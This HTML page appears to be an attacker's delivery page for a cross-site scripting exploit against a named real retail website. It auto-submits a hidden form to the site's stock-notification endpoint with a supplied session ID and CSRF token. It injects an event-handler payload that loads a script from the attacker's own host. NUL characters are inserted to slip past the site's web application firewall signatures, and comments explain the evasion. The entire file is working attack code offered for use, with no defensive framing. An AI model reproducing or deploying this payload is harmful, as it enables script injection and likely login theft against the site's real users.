<!doctype html><html><head><meta charset="utf-8"><title>watsons</title></head>
<body style="font:14px sans-serif;padding:24px">
<p id="msg">Delivering…</p>
<form id="f" method="POST"><input type="hidden" name="_csrf" id="c"><input type="hidden" name="varCode" id="v"></form>
<script>
// FND-014 delivery page. Session pair comes from the query string so this page never goes stale:
//   login4.html?sid=<JSESSIONID>&tok=<csrfToken>     (mint a fresh pair with mint.sh)
var q   = new URLSearchParams(location.search);
var SID = q.get('sid') || '';
var TOK = q.get('tok') || '';
if (!SID || !TOK) {
  document.getElementById('msg').textContent =
    'Missing ?sid=<JSESSIONID>&tok=<csrfToken>. Mint a fresh pair (mint.sh) and retry — a stale pair gets a 403 from Akamai.';
} else {
  var N = String.fromCharCode(0);   // NUL splits the Akamai signatures (GAD-012); Hybris strips it
  var f = document.getElementById('f');
  f.action = 'https://www.watsons.ua/uk/stockAnonymousNotification;jsessionid=' + SID;
  document.getElementById('c').value = TOK;
  document.getElementById('v').value =
    'A"' + N + '><details open on' + N + 'toggle="s=docu' + N +
    "ment.createElement('scr'+'ipt');s.src='" + location.origin + "/login4.js';docu" + N +
    'ment.body.appendChild(s)">';
  f.submit();
}
</script>
</body></html>
